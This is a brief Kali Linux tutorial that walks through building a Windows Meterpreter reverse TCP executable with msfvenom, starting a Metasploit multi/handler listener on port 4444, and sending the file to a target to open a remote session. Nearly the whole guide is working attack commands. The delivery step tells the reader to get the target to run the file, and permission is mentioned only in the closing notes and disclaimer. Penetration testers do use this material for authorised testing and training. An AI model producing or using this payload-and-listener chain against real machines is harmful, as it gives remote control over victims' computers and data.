# Metasploit Setup and Usage on Kali Linux

This guide explains how to set up and use Metasploit on Kali Linux for creating and running a reverse TCP payload.

## Prerequisites

- Kali Linux installed and running.
- Metasploit Framework installed (comes pre-installed with Kali Linux).
- Basic understanding of networking and penetration testing.

---

## Steps to Create and Use the Payload

### 1. Generate the Payload

Use the `msfvenom` command to generate a reverse TCP payload. Run the following command in your terminal:

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=YOUR_IP lport=4444 -f exe > whatevernamefile.exe
```

- Replace `YOUR_IP` with your Kali Linux machine's IP address.
- The payload will be saved as `whatevernamefile.exe` in the current directory.

---

### 2. Start the Metasploit Console

Run the following command to start the Metasploit console:

```bash
msfconsole
```

---

### 3. Set Up the Exploit Handler

Once inside the Metasploit console, execute the following commands:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
run
```

- Replace `YOUR_IP` with your Kali Linux machine's IP address.

---

### 4. Deploy the Payload

Send the generated `whatevernamefile.exe` to the target machine and execute it. Once the payload is executed on the target machine, you will get a Meterpreter session in the Metasploit console.

---

## Notes

- Ensure that your firewall or network settings allow connections on port `4444`.
- Use this setup only in environments where you have explicit permission to perform penetration testing.

---

## Disclaimer

This guide is for educational purposes only. Unauthorized use of these tools is illegal and unethical.
